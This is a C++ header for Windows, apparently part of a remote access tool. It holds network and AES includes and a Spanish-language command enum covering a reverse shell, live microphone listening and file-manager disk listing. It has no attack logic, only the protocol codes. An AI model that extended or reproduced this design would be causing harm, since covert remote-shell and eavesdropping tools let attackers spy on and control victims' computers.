#ifndef ___HEADERS
#define ___HEADERS 1

#include<ws2tcpip.h>
#include<windows.h>
#include<lmcons.h>
#include <intrin.h>
#include<iostream>
#include<mutex>
#include<atomic>
#include<map>
#include<thread>
#include<random>
#include<fcntl.h>
#include<fstream>
#include<sstream>
#include<string>
#include<vector>
#include<cstring>
#include<ctime>
#include<sys/stat.h>
#include<shlobj.h>


#include <iomanip>

#include "aes256/aes256.hpp"

#define AES_KEY_LEN 32

#define error() std::cout<<"Error["<<GetLastError()<<"]\n";
#define error_2(x) std::cout<<"["<<x<<"]"<<"Error["<<GetLastError()<<"]\n";


typedef unsigned int u_int;

#define ___DEBUG_

namespace EnumComandos {
    enum Enum {
        PONG = 499,
        PING,
        Reverse_Shell_Start,
        Reverse_Shell_Command,
        Reverse_Shell_Salida,
        Reverse_Shell_Finish,
        Mic_Refre_Dispositivos,
        Mic_Refre_Resultado,
        Mic_Iniciar_Escucha,
        Mic_Detener_Escucha,
        Mic_Live_Packet,
        FM_Discos,
        FM_Discos_Lista,
        FM_Dir_Folder,
        FM_CPATH
    };
}


 
#endif
